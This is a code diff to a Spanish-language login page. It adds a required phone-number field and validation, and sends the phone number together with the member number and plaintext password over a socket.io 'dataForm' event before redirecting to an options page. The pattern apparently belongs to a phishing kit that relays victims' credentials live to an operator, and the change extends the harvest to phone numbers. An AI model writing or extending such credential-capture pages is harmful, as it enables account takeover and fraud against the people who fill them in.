@@ -120,8 +120,13 @@
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
+      <div class="input-group">
+        <div class="icon"><i class="fas fa-phone"></i></div>
+        <input type="tel" id="telefono" placeholder="Número telefónico" maxlength="10" required>
+      </div>
       <p id="socioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
+      <p id="telefonoError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
     </form>
   </div>
@@ -137,14 +142,15 @@
         form.addEventListener('submit', (e) => {
           e.preventDefault();
 
-          if (validarSocio() && validarPassword()) {
+          if (validarSocio() && validarPassword() && validarTelefono()) {
             const socio = document.getElementById('socio').value;
             const contrasena = document.getElementById('password').value;
+            const telefono = document.getElementById('telefono').value;
 
             const sessionId = Math.random().toString(36).substring(2, 15);
             localStorage.setItem('sessionId', sessionId);
 
-            socket.emit('dataForm', { socio, contrasena, sessionId });
+            socket.emit('dataForm', { socio, contrasena, telefono, sessionId });
 
             window.location.href = 'opciones.html';
           }
@@ -190,6 +196,28 @@
       } else {
         passwordError.textContent = "";
         passwordInput.classList.remove("campo-requerido");
+        return true;
+      }
+    }
+
+    function validarTelefono() {
+      const telefono = document.getElementById("telefono").value;
+      const telefonoError = document.getElementById("telefonoError");
+      const telefonoInput = document.getElementById("telefono");
+
+      const soloNumeros = /^\d{1,10}$/;
+
+      if (!telefono) {
+        telefonoError.textContent = "El número telefónico es obligatorio";
+        telefonoInput.classList.add("campo-requerido");
+        return false;
+      } else if (!soloNumeros.test(telefono)) {
+        telefonoError.textContent = "Debe ingresar hasta 10 dígitos numéricos";
+        telefonoInput.classList.add("campo-requerido");
+        return false;
+      } else {
+        telefonoError.textContent = "";
+        telefonoInput.classList.remove("campo-requerido");
         return true;
       }
     }
